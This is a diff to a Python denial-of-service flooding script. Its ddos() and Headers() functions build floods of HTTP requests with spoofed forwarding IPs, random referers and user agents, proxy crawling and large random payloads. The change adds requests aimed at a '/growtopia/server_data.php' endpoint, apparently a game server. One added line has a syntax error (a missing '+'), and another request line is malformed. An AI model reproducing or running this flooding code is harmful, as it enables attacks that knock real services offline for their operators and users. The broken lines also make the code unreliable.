@@ -2413,6 +2413,7 @@ def Headers(method):
     if method == "UDP" or method == "TCP" or method == "HTTP":
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
         post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
+        post_again = "POST http://" + ip + "/growtopia/server_data.php"
         get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
         referer = "Referer: " + random.choice(referers) + ip + "\r\n"
         connection = "Connection: Keep-Alive\r\n" + "\r\n"
@@ -2431,13 +2432,14 @@ def Headers(method):
             0, 255)) + "." + str(random.randint(0, 255)) + "." + str(
                 random.randint(0, 255)) + "\r\n"
         useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
-        request = post_host + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
+        request = post_host + post_again get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
     return header
 
 def ddos():
     socksCrawler()
     get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
+    post_again = "POST http://" + ip + "/growtopia/server_data.php"
     get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
     referer = "Referer: " + random.choice(referers) + ip + "\r\n"
     connection = "Connection: Keep-Alive\r\n" + "\r\n"
@@ -2457,7 +2459,7 @@ def ddos():
         0, 255)) + "." + str(random.randint(0, 255)) + "." + str(
             random.randint(0, 255)) + "\r\n"
     useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
-    request = post_host + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
+    request = post_host + post_again + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
     data = random._urandom(10999)
     data1 = random._urandom(10899)
     data2 = random._urandom(10199)
